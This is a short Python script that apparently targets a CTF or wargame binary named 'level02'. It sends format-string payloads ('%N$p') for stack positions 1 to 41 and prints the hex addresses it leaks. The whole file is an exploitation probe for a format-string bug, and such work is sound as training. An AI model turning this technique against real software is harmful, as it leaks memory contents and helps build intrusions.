import os
import re

pattern = r"0x[0-9a-fA-F]+"

for i in range(1, 42):
    command = 'echo "%{}\$p" | ./level02'.format(i)
    stream = os.popen(command)
    output = stream.read()
    if output:
        match = re.search(pattern, output)
        if match:
            addr = match.group(0)
            print "Sequence {} found on stack position {}".format(addr, i)
